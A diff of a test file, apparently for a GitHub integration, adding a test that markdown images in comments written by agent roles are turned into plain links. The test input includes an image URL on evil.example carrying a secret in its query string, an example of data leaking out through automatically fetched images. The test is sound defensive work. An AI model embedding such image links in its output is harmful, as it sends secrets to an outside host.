@@ -6,7 +6,7 @@ import { db } from "../src/db/client.js";
 import { newId } from "../src/db/ids.js";
 import { externalIdentities, externalThreadLinks, messages, tasks, topics } from "../src/db/schema.js";
 import { deliverPending } from "../src/integrations/delivery.js";
-import { setGithubFetch } from "../src/integrations/github.js";
+import { imagesAsLinks, setGithubFetch } from "../src/integrations/github.js";
 import { call, reply } from "./support/harness.js";
 import { buildWorld, type World } from "./support/world.js";
 
@@ -103,6 +103,14 @@ afterEach(async () => {
 });
 
 describe("github", () => {
+  it("images in a comment become links, so GitHub fetches no address a role wrote", () => {
+    const md =
+      "看图 ![屏幕](https://evil.example/x.png?d=secret) 和 ![][ref]\n\n```\n![代码里](a.png)\n```\n\n[ref]: https://x.dev/y.png";
+    expect(imagesAsLinks(md)).toBe(
+      "看图 [🖼 屏幕](https://evil.example/x.png?d=secret) 和 [🖼 ][ref]\n\n```\n![代码里](a.png)\n```\n\n[ref]: https://x.dev/y.png",
+    );
+  });
+
   it("verifies signatures and accepts the ping", async () => {
     expect((await send("ping", { zen: "hi" })).status).toBe(200);
     expect((await send("ping", { zen: "hi" }, "wrong")).status).toBe(401);
